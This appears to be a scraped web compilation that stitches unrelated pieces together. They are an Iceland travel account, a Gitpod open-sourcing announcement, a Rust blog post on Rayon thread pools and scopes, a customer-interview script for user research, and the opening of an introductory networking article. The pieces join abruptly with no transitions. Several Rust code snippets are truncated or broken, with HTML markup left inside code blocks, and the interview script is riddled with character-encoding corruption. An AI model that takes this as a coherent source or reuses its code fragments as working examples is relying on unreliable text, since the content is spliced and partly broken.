			<p>Skógafoss is another large waterfall located several kilometers from Seljalandsfoss. The force of water flowing down this waterfall is massive. It sprays a barrage of mist into the air at the bottom, preventing you from getting too close (unless you like cold showers). A trail extends up the right side of the waterfall, with a few outcroppings that you can climb on to get a better view. Climbing to the top gives you a sense of the tremendous amount of water falling down the waterfall.</p>
			<p>There is a surprising amount of wildlife at Skógafoss. Sheep and horses graze the hillsides, gulls drift through the air before perching in nests alongside the waterfall.</p>

			<h2>
				<span>Vík</span>
				<span>Black Sands</span>
			</h2>
			<p>At the southern tip of Iceland lies a small, cozy town by the name of Vík. Just west of Vík is a stretch of black sand and a small peninsula called Dyrhólaey. This is one of the most awe-inspiring places in Iceland. The Atlantic ocean batters the beach vigorously – huge waves crash, fierce winds blow, water wears away at the pitch-black volcanic rock. You can climb over some curiously-shaped basalt columns while gazing out at the ocean. In the distance stand two columns of black rock, Reynisfjara and Reynisdrangar, planted tenaciously in the ocean.</p>

			<h2>
				<span>Fjaðrárgljúfur</span>
			</h2>
			<p>After spending a night in Vík at a wonderful cabin, we set off east towards the next leg of the adventure.</p>
			<p>We stopped first at Fjaðrárgljúfur, a deep canyon in the southeast of Iceland. It is accessible by a gravel path that gave our poor rental quite a beating. A trail hugs the lip of the canyon for quite a long way. You can even travel the bed of the canyon by foot – the river that flows through it is fairly shallow. We caught a glimpse of a few travelers wading through the water, and another man with a fishing pole.</p>

			<p>We stopped next at one of the most unique locations in the world. Jökulsárlón is a lagoon at the edge of a flow from the Breiðamerkurjökull glacier. Icebergs break off of the glacier and float around in the lagoon. The air is incredibly cold and quiet, and the icebergs have a luminous blue tinge to them. Stunned by the sound of cracking ice, we witnessed an iceberg breaking in two, sending huge ripples along the smooth surface of the water.</p>

			<p>We began the the journey the next day by visiting Seyðisfjörður, a fjord in the eastern region of Iceland. We ascended a mountain pass covered in snow, and then descended through thick fog. After taking a pit stop to check out Gufufoss, we arrived in the town proper.</p>

			<h2>
				<span>Dettifoss</span>
			</h2>
			<p>After diverging from the main road down a gravel road, we reached a natural wonder. Dettifoss is the most powerful waterfall in Europe, fed by water from the Vatnajökull glacier. The water is a greyish-brown, filled with sediment that gives it a primal look. The waterfall can be viewed from either side of the river, though both sides are unique. The eastern side is rocky and jagged, whereas the western side is lush and mossy. There are no guardrails here – you can walk up right the the edge of the water. The sheer size of the drop and the volume of water flowing are breathtaking.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As of today Gitpod is open source under the AGPL license at <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">github.com/gitpod-io/gitpod</a>. This allows the community to participate in the development of Gitpod, provides more transparency and makes it even easier for developers to use and integrate Gitpod in their workflows.</p>
<p>For those of you who know us, this probably does not come as a big surprise. Working in open source is in our DNA and everything we’ve created over the past 10 years, including <a href="https://github.com/eclipse-theia/theia" target="_blank" rel="nofollow noopener noreferrer">Theia</a>, <a href="https://github.com/eclipse/xtext" target="_blank" rel="nofollow noopener noreferrer">Xtext</a>, <a href="https://github.com/eclipse/openvsx" target="_blank" rel="nofollow noopener noreferrer">Open VSX</a> and many other projects have been open source. In fact, Gitpod was our only closed-source project and it is a relief to change that going forward.</p>

<p>Contributing to Gitpod should be easy and accessible for everyone. All contributions are welcome, including pull requests, issues, documentation as well as updates and tweaks, blog posts, tutoials, and more. Please head over to <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">Github</a> to find out about the various ways you can contribute and join our <a href="https://community.gitpod.io/" target="_blank" rel="nofollow noopener noreferrer">Gitpod Community</a>.</p>
<p>Over the past year, Gitpod has simplified contributions to many open source projects (see <a href="https://contribute.dev/" target="_blank" rel="nofollow noopener noreferrer">contribute.dev</a> for examples). Today, everyone in our team is excited to share our own streamlined development pipeline including Kubernetes preview deployments, an aggressively cached build system, our own slim and fast CI system and of course Gitpod, which continuously beams us into ready-to-code (and debug) dev environments. <a href="https://github.com/csweichel" target="_blank" rel="nofollow noopener noreferrer">Chris</a> gave a great talk about this setup earlier this year 👇</p>
<div> <p> <iframe title="" src="https://www.youtube.com/embed/dFMpXUsJcGM?rel=0" allowfullscreen=""></iframe> </p> </div>
<p>Naturally, we develop Gitpod in Gitpod. This allows the  whole team  to spin up fully initialized, remote dev environments on any branch at any time. </p>
<p>In line with the <a href="http://cloudscaling.com/blog/cloud-computing/the-history-of-pets-vs-cattle/?utm_source=thenewstack&amp;utm_medium=website&amp;utm_campaign=platform" target="_blank" rel="nofollow noopener noreferrer">pets vs. cattle</a> analogy of the cloud-native world, we treat dev environments as automated (yet customizable) resources you can spin up when you need them and close down (and forget about) when you are done with your task. Once you experience the peace of mind of automated, ephemeral dev environments you never want to go back.</p>
<p>Sven will run a webinar next week on Thursday, where we will showcase how we use Gitpod internally at Gitpod and how much it improves our workflow. Hope to see you there! </p>



<p>The <a href="https://www.gitpod.io/pricing/#" target="_blank" rel="nofollow noopener noreferrer">SaaS offering of gitpod.io</a> remains the easiest way to streamline your development workflows with continuously prebuilt dev environments. </p>
<p>In case you want to host Gitpod on your own infrastructure or private cloud, starting today, Gitpod Self-Hosted is free for unlimited users. Organizations using Gitpod Self-Hosted can purchase an enterprise license in order to get additional features like:</p>
<ul>
<li><a href="https://www.gitpod.io/features/#snapshot" target="_blank" rel="nofollow noopener noreferrer">Snapshots</a> (share a reproducible workspace with your team)</li>
<li><a href="https://www.gitpod.io/features/#share" target="_blank" rel="nofollow noopener noreferrer">Live Share</a> (invite others into your running workspace)</li>
<li><a href="https://www.gitpod.io/features/#prebuilt" target="_blank" rel="nofollow noopener noreferrer">Unlimited Prebuilds</a> (making ephemeral dev environments possible)</li>
<li>Admin Dashboard</li>
</ul>
<p>Offering a paid plan for enterprises makes it possible for us to keep working towards building a new category in developer tooling, which completes modern DevOps pipelines. In the future we will add additional functionality to both the open source code as well our paid offering.</p>

  <p>In <a href="https://pkolaczk.github.io/disk-parallelism/">the previous post</a>, I showed how processing 
file data in parallel can either boost or hurt performance 
depending on the workload and device capabilities. Therefore, in complex programs that mix tasks
of different types using different physical resources, e.g. CPU, storage (e.g. HDD/SSD) 
or network I/O, a need may arise to configure parallelism levels differently for each task type. 
This is typically solved by scheduling tasks of different types on dedicated thread pools.
In this post I’m showing how to implement a solution in Rust with <a href="https://crates.io/crates/rayon">Rayon</a>. 
<!--more--></p>

<p>After I realized multi-threaded access to data on a single HDD is a <em>really bad idea</em>, 
I wanted to process files residing on HDD with only one thread-per-device, but still keep multithreading for SSDs.
Also, both groups of files should be processed independently, in parallel.
Honestly, that didn’t look like something hard to do. I’ve been using thread pools in Java for years.
For each file to process, I just need to schedule an asynchronous hashing task on a proper thread pool 
executor and that’s it. How hard could that be in Rust?</p>

<p>My program already used Rayon in a very functional style, so the main part of the code responsible for file hashing 
looked like that:</p>

<div><div><pre><code><span>let</span> <span>files</span><span>:</span> <span>Vec</span><span>&lt;</span><span>std</span><span>::</span><span>path</span><span>::</span><span>PathBuf</span><span>&gt;</span> <span>=</span> <span>...</span>   <span>// collection of input files</span>
<span>let</span> <span>hashes</span><span>:</span> <span>Vec</span><span>&lt;</span><span>FileHash</span><span>&gt;</span> <span>=</span> <span>files</span>
  <span>.into_par_iter</span><span>()</span>           <span>// creates a Rayon parallel iterator over all files</span>
  <span>.map</span><span>(|</span><span>f</span><span>|</span> <span>compute_hash</span><span>(</span><span>f</span><span>))</span>  <span>// reads the contents of a file and returns its hash; blocking</span>
  <span>.collect</span><span>();</span>                
</code></pre></div></div>
<p>In this approach, all the files are processed by the default Rayon thread pool and
there is no place to tell Rayon which thread pool to use for given file.</p>



<p>Rayon allows to build custom thread pools with <code>ThreadPoolBuilder</code> and <code>ThreadPool</code> structs. 
It is quite easy to create a custom thread pool and manually spawn tasks on it:</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>thread</span><span>;</span>
<span>let</span> <span>pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span>
    <span>.num_threads</span><span>(</span><span>4</span><span>)</span>
    <span>.build</span><span>()</span>
    <span>.unwrap</span><span>();</span>
<span>pool</span><span>.spawn</span><span>(||</span> <span>println!</span><span>(</span><span>"Task executes on thread: {:?}"</span><span>,</span> <span>thread</span><span>::</span><span>current</span><span>()</span><span>.id</span><span>()));</span>
<span>pool</span><span>.spawn</span><span>(||</span> <span>println!</span><span>(</span><span>"Task executes on thread: {:?}"</span><span>,</span> <span>thread</span><span>::</span><span>current</span><span>()</span><span>.id</span><span>()));</span>
</code></pre></div></div>

<p>In order to process our collection on this custom thread pool, we need to change the “main loop” of 
a program slightly and replace the parallel iterator with a traditional loop and a channel to receive the 
results:</p>

<div><div><pre><code><span>let</span> <span>pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span>

<span>let</span> <span>files</span><span>:</span> <span>Vec</span><span>&lt;</span><span>std</span><span>::</span><span>path</span><span>::</span><span>PathBuf</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>let</span> <span>(</span><span>tx</span><span>,</span> <span>rx</span><span>)</span> <span>=</span> <span>std</span><span>::</span><span>sync</span><span>::</span><span>mpsc</span><span>::</span><span>channel</span><span>();</span>
<span>for</span> <span>f</span> <span>in</span> <span>files</span><span>.into_iter</span><span>()</span> <span>{</span>
    <span>let</span> <span>tx</span> <span>=</span> <span>tx</span><span>.clone</span><span>();</span>  
    <span>pool</span><span>.spawn</span><span>(</span><span>move</span> <span>||</span> <span>{</span> 
        <span>tx</span><span>.send</span><span>(</span><span>compute_hash</span><span>(</span><span>f</span><span>))</span><span>.unwrap</span><span>();</span> 
    <span>});</span>
<span>}</span>
<span>drop</span><span>(</span><span>tx</span><span>);</span> <span>// need to close all senders, otherwise...</span>
<span>let</span> <span>hashes</span><span>:</span> <span>Vec</span><span>&lt;</span><span>FileHash</span><span>&gt;</span> <span>=</span> <span>rx</span><span>.into_iter</span><span>()</span><span>.collect</span><span>();</span>  <span>// ... this would block</span>
</code></pre></div></div>


<p>Now it is quite straightforward to transform this approach to more than one thread pool:</p>

<div><div><pre><code><span>let</span> <span>hdd_pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span><span>.num_threads</span><span>(</span><span>1</span><span>)</span><span>.build</span><span>()</span><span>.unwrap</span><span>();</span>

</code></pre></div></div>

<p>The implementation of <code>is_on_ssd</code> is left as an exercise for the reader ;)</p>


<p>Unfortunately <code>ThreadPool.spawn()</code> method requires that the lambda passed to it has a 
<code>'static</code> lifetime, which means it must not borrow any data other than global. 
The examples above work only because we pass all the input data by <code>move</code>, so the lambda
does not close over anything outside and the <code>'static</code> constraint is satisfied.</p>

<p>Of course the real world is much more complex, and, in my program actually the spawned task<br>
needed to borrow the local context, which holds some common stuff like configuration or logger.</p>

<p>Referencing any outside variable from inside of <code>spawn</code> lambda does not compile:</p>
<div><div><pre><code><span>let</span> <span>logger</span><span>:</span> <span>Log</span> <span>=</span> <span>Log</span><span>::</span><span>new</span><span>();</span>

<p>The compiler can’t see that all the tasks we spawned must finish before we leave the scope
where <code>logger</code> is valid. This is where Rayon scopes are coming to rescue us.</p>

<p>Instead of spawning tasks directly on the thread pool struct, we first need to create a scope 
object by calling <code>scope</code> function. The scope is guaranteed to exit only after all tasks launched 
inside it finished. This essentially allows the tasks inside the scope to access variables that live 
at least as long as the scope:</p>

<span>});</span>

<p>What about multiple thread pools? 
A single <code>Scope</code> in Rayon is always associated with a single <code>ThreadPool</code>. 
Therefore, if we need multiple thread pools, then we need multiple scopes, active at the same time.
Fortunately, scopes can be nested:</p>

<div><div><pre><code><span>let</span> <span>(</span><span>tx</span><span>,</span> <span>rx</span><span>)</span> <span>=</span> <span>std</span><span>::</span><span>sync</span><span>::</span><span>mpsc</span><span>::</span><span>channel</span><span>();</span>

<h2 id="dynamic-number-of-thread-pools">Dynamic Number of Thread Pools</h2>
<p>With only two pools, nesting doesn’t look bad, but in my program I needed more than two pools – 
one per each physical device. And even worse, I didn’t know the number of them statically at compile time.</p>

<p>At this point I wanted to abstract out the process of creating nested scopes in a way it doesn’t pollute the 
logic of the program. I came up with the following function idea:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>multi_scope</span><span>&lt;</span><span>'scope</span><span>,</span> <span>OP</span><span>,</span> <span>R</span><span>&gt;</span><span>(</span><span>pools</span><span>:</span> <span>&amp;</span><span>[</span><span>&amp;</span><span>ThreadPool</span><span>],</span> <span>op</span><span>:</span> <span>OP</span><span>)</span> <span>-&gt;</span> <span>R</span>
<span>where</span>
    <span>OP</span><span>:</span> <span>for</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>FnOnce</span><span>(</span><span>&amp;</span><span>'s</span> <span>[</span><span>&amp;</span><span>'s</span> <span>Scope</span><span>&lt;</span><span>'scope</span><span>&gt;</span><span>])</span> <span>-&gt;</span> <span>R</span> <span>+</span> <span>'scope</span> <span>+</span> <span>Send</span><span>,</span>
    <span>R</span><span>:</span> <span>Send</span>
</code></pre></div></div>

<p>This takes an array of <code>ThreadPool</code> references, constructs a <code>Scope</code> for each <code>ThreadPool</code> 
and executes a user-defined operation (typically passed as a lambda) inside all of these scopes.
The operation receives a list of references to <code>Scope</code> so it can spawn tasks on desired <code>Scope</code> associated
with the given <code>ThreadPool</code>. The usage is quite straightforward and very similar to the built-in <code>scope</code>:</p>

<div><div><pre><code><span>use</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>;</span>

<span>let</span> <span>hdd_pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span><span>.num_threads</span><span>(</span><span>1</span><span>)</span><span>.build</span><span>()</span><span>.unwrap</span><span>();</span>

<span>let</span> <span>common</span> <span>=</span> <span>vec!</span><span>[</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>];</span> <span>// common data</span>
<span>multi_scope</span><span>(</span><span>&amp;</span><span>pools</span><span>,</span> <span>|</span><span>scopes</span><span>|</span> <span>{</span>
    <span>scopes</span><span>[</span><span>0</span><span>]</span><span>.spawn</span><span>(|</span><span>s</span><span>|</span> <span>{</span> <span>/* execute on hdd_pool, can use &amp;common */</span> <span>});</span>
    <span>scopes</span><span>[</span><span>1</span><span>]</span><span>.spawn</span><span>(|</span><span>s</span><span>|</span> <span>{</span> <span>/* execute on ssd_pool, can use &amp;common */</span> <span>});</span>
<span>});</span>
</code></pre></div></div>

<p>How to implement <code>multi_scope</code>? There is no way to obtain a <code>Scope</code> value directly from Rayon.
The only way we can get a reference to a <code>Scope</code> is inside the lambda passed to <code>scope</code>.
So if we need multiple scopes active at the same time, we must nest scopes in each other. 
This sounds like a recursion.</p>

<p>An additional function <code>nest</code> creates one new <code>Scope</code> and pushes it into the <code>scopes</code> vector, then it calls itself
recursively until it runs out of <code>ThreadPool</code> values. Finally it calls the user operation <code>op</code> 
passing the created <code>scopes</code> vector to it.</p>

<p>To my surprise that didn’t compile. Oh well!</p>

<p>Using a customer research script for user interviews is the best way to ensure quality research outcomes.</p>

<p>Scripts make it easier to prepare, reduce the risk of introducing bias, and produce consistent &amp; replicable insights.</p>

<p>Hereâ€™s a quick teardown of a script Iâ€™ve been using for research into how user researchers &amp; product designers leverage research for our product <a href="http://greatquestion.co/">Great Question</a>.</p>

<p>Itâ€™s very meta.</p>

<h4 id="who-is-this-for">Who is this for?</h4>
<p>This is a solid base for team relatively new to user interviews, particularly those building B2B SaaS products, but thereâ€™s likely useful ideas in here for anyone doing user research.</p>

<p>Scroll to the end if you want to download the script in its entirety.</p>

<h4 id="two-things-worth-noting">Two things worth noting:</h4>
<ol>
  <li>
    <p>The script is a guide.
Donâ€™t let the script stop you from exploring any topics or questions that might come up; often the golden insights come out from these tangents. Just make sure you come back to the script questions so you get answers to all of your questions.</p>
  </li>
  <li>
    <p>Notes or it didnâ€™t happen.
At the end of the interview tag up all of the answers so you can reference them later. Iâ€™ve used a spreadsheet with a row for each question, and Iâ€™ve also used custom UX repositories like <a href="https://dovetailapp.com/">Dovetail</a> too.</p>
  </li>
</ol>

<h3 id="preamble">Preamble:</h3>
<blockquote>
  <p>First of all thanks for taking the time to talk to us.</p>
</blockquote>

<blockquote>
  <p>As background Iâ€™m a software engineer &amp; entrepreneur, having sold my last company to GoDaddy and currently advising other companies on building scaleable products.</p>
</blockquote>

<p>You want to make it personable. Who are you and why should I be talking to you?</p>

<blockquote>
  <p>Iâ€™m now trying to scratch our own itch by making it easier for folks who build product to get closer to their customers &amp; do better quality customer research.</p>
</blockquote>

<blockquote>
  <p>Today we have a series of questions to better understand you, the work you do, and what role research takes in your organization. Weâ€™re going to start fairly broad and get more targeted as we go.</p>
</blockquote>

<p>Tell them what youâ€™re going to do up front . The start of an interview can feel quite vague.  â€œWhy are you asking me about this stuff? I thought we were going to talk about your product?â€�</p>

<blockquote>
  <p>Finally weâ€™ll finish off by giving you a brief outline of what the product actually does to see how it resonates.</p>
</blockquote>

<p>The payoff for the interview will come at the end if they just stick it out.</p>

<blockquote>
  <p>Before we start we have two pieces of house keeping.</p>
</blockquote>

<blockquote>
  <p>The first is that weâ€™re not trying to sell you anything. We just want your open and honest experiences and opinions to help us understand if there is a need for a product like this in the market.</p>
</blockquote>

<p>This is critical to a successful interview. No one wants to feel like theyâ€™re on a sales call where anything they say in the affirmative might be used against them.</p>

<blockquote>
  <p>The second is that weâ€™d like to record this call so we can focus on what youâ€™re saying and take our notes formally later. Do you mind if we record?</p>
</blockquote>

<p>Recording the interview means you can play it back for your own recollection, and to share with your team. Youâ€™ll surprise yourself how often you can misinterpret a customers comments.</p>

<p>Recording isnâ€™t always the right path - sometimes folks wonâ€™t open up as much if they know theyâ€™re being recorded - but should be a default where possible.</p>

<h3 id="interviewee-kickoff">Interviewee kickoff</h3>
<blockquote>
  <p>To get started can you tell us about yourself, â€˜company_nameâ€™ and your role as a â€˜titleâ€™?</p>
</blockquote>

<p>What made you want to join â€˜companyâ€™? What did you do before this?</p>

<p>From a practical perspective this is helpful for identifying the customer if youâ€™re doing a lot of interviews, but it also helps to understand the individual - their seniority &amp; their motivations.</p>

<p>Can you tell me about the work youâ€™re doing - maybe some of the projects youâ€™re working on, your goals for the quarter, and the challenges youâ€™re facing or trying to solve?</p>

<p>We want to get a sense of a day in the life of the interviewee. Whatâ€™s driving them? Who are they working with? What problems are they solving? These questions will help us to do call-backs later in the interview that a) affirm youâ€™ve been actively listening and b) ground your questions on their lived experience vs hypotheticals.</p>

<h3 id="main-interview">Main Interview</h3>
<blockquote>
  <p>What kinds of user research do you do at â€˜companyâ€™?</p>
</blockquote>

<p>We now want to frame the conversation based on what weâ€™re trying to learn with our interviews. For us this is about user research so we want to first understand what activities theyâ€™re already doing here.</p>

<blockquote>
  <p>What gets in the way of doing great research?</p>
</blockquote>

<p>â€œWhat gets in the way of doing great Xâ€� is a setup Iâ€™ve used multiple times across a range of products. Itâ€™s probably not a question theyâ€™ve been asked lately, and perhaps havenâ€™t thought about before so it often breaks them out of any rote responses theyâ€™ve been giving you so far.</p>

<blockquote>
  <p>What do you think you do well at â€˜companyâ€™ in terms of user research?</p>
</blockquote>

<p>You want to get a better sense of what theyâ€™re proud of. You might find that theyâ€™re doing everything to industry best practices - and you might learn a trick or two.</p>

<blockquote>
  <p>What do you think you could improve in terms of your user research processes?</p>
</blockquote>

<p>How conscious are they of their own weaknesses? Ultimately this question helps to identify problems that your product might be able to help solve.</p>

<p>How do you find candidates to speak to?</p>

<p>This question is potentially overly specific but talks to a series of questions you might ask about the customers work flow. How do they do X, how do they do Y? What problems get in the way of them doing this?</p>

<p>What tools do you use for user research?</p>

<p>What products might you need to integrate with? What things might you replace for the customer?</p>

<blockquote>
  <p>Looking at my notes youâ€™ve listed a bunch of challenges youâ€™re up against:</p>
</blockquote>

<blockquote>
  <ul>
    <li>Challenge 1</li>
    <li>Challenge 2</li>
    <li>Challenge 3</li>
  </ul>
</blockquote>

<blockquote>
  <p>Did I miss any challenges youâ€™ve mentioned or are experiencing?</p>
</blockquote>

<blockquote>
  <p>Would you mind stack ranking these for me? What are the most important ones for you to solve?</p>
</blockquote>

<p>This is the most pivotal question of any interview. Youâ€™ve unearthed a range of problems the customer experiences, but getting them to prioritize these is invaluable. If the problems youâ€™re trying to solve with your product isnâ€™t in the top 3 problem set then you might not be building something people want - or at least not this person / persona.</p>

<p>However if the problem youâ€™re solving is in their top 1-3 problems to solve, you can dive deeper again.</p>

<p>OK so making user research operations more self-serve and scaleable for your product teams is your 2nd biggest pain point. How likely are you to solve that this quarter?</p>

<blockquote>
  <p>How do you plan to solve this problem?</p>
</blockquote>

<blockquote>
  <p>Who else will be involved in helping you fix this?</p>
</blockquote>

<blockquote>
  <p>Do you have a budget allocated to solve it?</p>
</blockquote>

<p>These questions are variations on the question of how high a priority the problem is to solve. We then go further to understand how they might solve the problem - which reveals where they might search for a solution and could aid our marketing; and whether their is budget allocated that could be spent on our solution.</p>

<h3 id="the-pitch">The Pitch</h3>
<blockquote>
  <p>This has been incredibly valuable - thank you!</p>
</blockquote>

<blockquote>
  <p>Now weâ€™d like to tell you a little about the product weâ€™re building to see how it resonates with you.</p>
</blockquote>

<blockquote>
  <p>Weâ€™re building a product to help â€˜customer_typeâ€™ solve â€˜big_hairy_problemâ€™</p>
</blockquote>

<blockquote>
  <p>We help you â€˜product_benefitsâ€™, by â€˜product_featuresâ€™.</p>
</blockquote>

<blockquote>
  <p>How does this product resonate with you? How would something like this fit into your user research practice?</p>
</blockquote>

<p>This pitch is less about selling the customer, more to see how your solution fits into their world view. I always take any reactions here with a grain of salt - unless theyâ€™re keen to trial or use the product.</p>

<p>â€œSounds awesome!â€� is a common refrain, but unless the credit card is coming out I chalk this up to a polite reaction.</p>

<h3 id="outro">Outro</h3>
<blockquote>
  <p>Thanks for taking the time to talk to us, I think we have plenty to go on.</p>
</blockquote>

<blockquote>
  <p>Two last questions for you:
Weâ€™d love to keep in touch to get your feedback on our prototypes as we incorporate feedback from product folks like yourself. Do you mind if we send you the odd question via email?</p>
</blockquote>

<p>Itâ€™s nice to get an opt in for future research. If you have an product you can show them you might ask if you can do a demo and setup time for a future meeting.</p>

<blockquote>
  <p>The second is weâ€™re wondering if  there is anyone else you think we should be talking to? Weâ€™re less looking for introductions than an insight into the types of people and companies you think could provide some insight into their user research process.</p>
</blockquote>

<p>In our case we started talking to product designers, who were awesome but often not responsible for research tooling. They quickly lead us to â€œyou should talk to our product manager / research leadâ€� which was valuable to focus our outreach efforts, and lead to some warm introductions too.</p>

Preface
</summary>

  <p>I wrote this article to introduce the Internet to a non-technical audience.
In order to get everyone on board,
I first explain basic concepts, such as
<a href="#communication-protocol">communication protocols</a>,
<a href="#network-topologies">network topologies</a>,
and <a href="#signal-routing">signal routing</a>.
The section about <a href="#internet-layers">Internet layers</a> becomes increasingly technical
and peaks with a deep dive into <a href="#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
If the beginning is too elementary for you,
then just skip ahead to more interesting sections.</p>

  <p>Due to the nature of the topic,
this article contains a lot of acronyms.
Many of them are <a href="https://en.wikipedia.org/wiki/Three-letter_acronym">three-letter acronyms (<abbr title="Three-Letter Acronym">TLA</abbr>)</a>,
but some are longer,
which makes them extended three-letter acronyms (<abbr title="Extended Three-Letter Acronym">ETLA</abbr>).
While I introduce most of the acronyms before using them,
you can simply hover over a <abbr title="Three-Letter Acronym">TLA</abbr> or an <abbr title="Extended Three-Letter Acronym">ETLA</abbr> with your mouse
if you forgot what they stand for.
If you are reading this on a touch device,
you have to touch the acronym instead.</p>

  <p>Let’s get right into it:
What is a protocol?</p>

</details>

<h2 id="communication-protocol">Communication protocol</h2>

<h3 id="communication-diagram">Communication diagram</h3>

<p>A <a href="https://en.wikipedia.org/wiki/Communication_protocol">communication protocol</a>
specifies how two parties can exchange information for a specific purpose.
In particular, it determines which messages are to be transmitted in what order.
If the two parties are computers,
a formal, well-defined protocol is easiest to implement.
In order to illustrate what is going on, however,
let’s first look at an informal protocol,
also known as <a href="https://en.wikipedia.org/wiki/Etiquette">etiquette</a>,
which we’re all too familiar with:</p>

</figcaption>
</figure>

<p>This is a <a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a>
and it highlights the temporal dimension of a protocol
in which messages are exchanged sequentially.</p>

<h3 id="communication-parties">Communication parties</h3>

<p>It also illustrates that communication is commonly initiated by one party,
whereby the recipient responds to the requests of the initiator.
Please note that this is only the case for one-to-one protocols,
in which each message is intended for a single recipient.</p>

<details>
  <summary id="broadcasting-and-information-security">
Broadcasting and information security
</summary>

  <p>There are also one-to-many protocols for <a href="https://en.wikipedia.org/wiki/Broadcasting">broadcasting</a>.
These are typically one-way protocols,
in which the recipients do not acknowledge the receipt of the transferred data.
Examples for such protocols are analog radio
or churches ringing their bells to indicate the time of day.
Both in the case of a single recipient and in the case of a broad target audience,
anyone with access to the physical medium and the right sensors receives the signal.
The difference is simply that,
in the former case,
entities ignore the messages
which are not addressed to them.
If the messages are not encrypted,
others can still read them, though.
And if the messages are not authenticated,
a malicious party might be able to alter them in transit.
Even when messages are encrypted and authenticated,
their exchange can still be interrupted,
by not relaying some messages
or by <a href="https://en.wikipedia.org/wiki/Radio_jamming">jamming</a> the signal.
The properties Confidentiality, Integrity, and Availability
form the so-called <abbr title="Confidentiality, Integrity, and Availability">CIA</abbr> triad of <a href="https://en.wikipedia.org/wiki/Information_security">information security</a>.</p>

</details>

<h3 id="communication-channel">Communication channel</h3>

<p>The above greeting protocol is used among humans
to establish a <a href="https://en.wikipedia.org/wiki/Communication_channel">communication channel</a> for a longer exchange.
In technical jargon,
such an exchange in preparation for the actual communication is called a <a href="https://en.wikipedia.org/wiki/Handshaking">handshake</a>.
The greeting protocol checks the recipient’s availability and willingness to engage in a conversation.
When talking to someone you have never spoken before,
it also ensures that the recipient understands your language.
I’ve chosen these two examples for their figurative value.
Why we actually <a href="https://en.wikipedia.org/wiki/Greeting">greet</a> each other
is mainly for different reasons:
To show our good intentions by making our presence known to each other,
to signal sympathy and courtesy by asking the superficial question,
and to indicate our relative social status to each other and to bystanders.
Another benefit of asking such a question is that,
even though it’s very shallow,
it makes the responder more likely to do you a favor
due to the psychological effect of
<a href="https://www.influenceatwork.com/principles-of-persuasion/#consistency">commitment and consistency</a>.</p>

<h2 id="handling-of-anomalies">Handling of anomalies</h2>

<h3 id="protocol-deviation">Protocol deviation</h3>

<p>Since your communication partner can be erratic,
a protocol needs to be able to handle deviations:</p>

<p>In order to detect transmission errors,
computers typically append a <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> to each message,
which the recipient then verifies.
The need to <a href="https://en.wikipedia.org/wiki/Retransmission_(data_networks)">retransmit</a> messages
can be reduced by adding redundancy to messages
so that the recipient can <a href="https://en.wikipedia.org/wiki/Error_detection_and_correction">detect and correct small errors</a> on their own.
A simple and very inefficient way of doing this is to repeat the content within each message several times.</p>

<h3 id="connection-loss">Connection loss</h3>

<p>It can also happen that a party loses their connection permanently,
for example by moving too far away for the signal to reach the recipient.
Since a conversation requires some attention from the communication partner,
abandoning a conversation unilaterally without notifying the other party
can be misused to block them from talking to someone else for some time.
In order to avoid binding resources for a prolonged period of time
and thereby potentially falling victim to a so-called
<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a>,
computers drop connections after a configurable duration of inactivity:</p>

  <figcaption>
Bob’s second message (in blue) arrives after his third message (in green).
</figcaption>
</figure>

<p>The solution for this is to enumerate all messages,
to reorder them on arrival,
and to ask the other party to retransmit any missing messages,
as we saw <a href="#data-corruption">above</a>.</p>

<h3 id="lack-of-interoperability">Lack of interoperability</h3>

<p>Besides defining the <a href="https://en.wikipedia.org/wiki/Syntax">syntax</a> (the format),
the <a href="https://en.wikipedia.org/wiki/Semantics">semantics</a> (the meaning),
and the order of the messages,
a protocol should also specify how to handle anomalies like the above.
Ambiguity in a standard
and willful deviation therefrom
result in incompatibilities between different implementations.
In combination with a lack of established standards in many areas,
which often leads to uncoordinated efforts by various parties,
incompatibilities are quite common in computer systems,
unfortunately.
This causes a lot of frustration for users and programmers,
who have to find workarounds for the encountered limitations,
but this cannot be avoided in a free market of ideas and products.</p>

<h2 id="network-topologies">Network topologies</h2>

<h3 id="communication-network">Communication network</h3>

<p>In practice, there are almost always more than two parties
who want to communicate with each other.
Together with the connections between them,
they form a <a href="https://en.wikipedia.org/wiki/Telecommunications_network">communication network</a>.
For the scope of this article,
we’re only interested in symmetric networks,
where everyone who can receive can also send.
This is not the case for analog radio and television networks,
where signals are broadcasted unidirectionally from the sender to the receivers.
In the case of our symmetric networks,
two entities are part of the same network
if they can communicate with each other.
If they cannot reach each other,
they belong to separate networks.</p>

<h3 id="nodes-and-links">Nodes and links</h3>

<p><a href="https://en.wikipedia.org/wiki/Node_(networking)">Nodes</a> are the entities
that communicate with each other over communication <a href="https://en.wikipedia.org/wiki/Data_link">links</a>.
We can visualize this as follows:</p>

</figure>

<p>The terminology is borrowed from <a href="https://en.wikipedia.org/wiki/Graph_theory">graph theory</a>,
where nodes are also called vertices
and links are also called edges.
The technical term for the structure of a network is <a href="https://en.wikipedia.org/wiki/Network_topology">topology</a>.
Different arrangements of nodes and links lead to different characteristics of the resulting network.</p>

<h3 id="fully-connected-network">Fully connected network</h3>

<p>A network is said to be fully connected
if every node has a direct link to every other node:</p>

A fully connected network with five nodes and ten links.

</figure>

<p>In graph theory, such a layout is known as a <a href="https://en.wikipedia.org/wiki/Complete_graph">complete graph</a>.
Fully connected networks scale badly
as the number of links grows quadratically with the number of nodes.
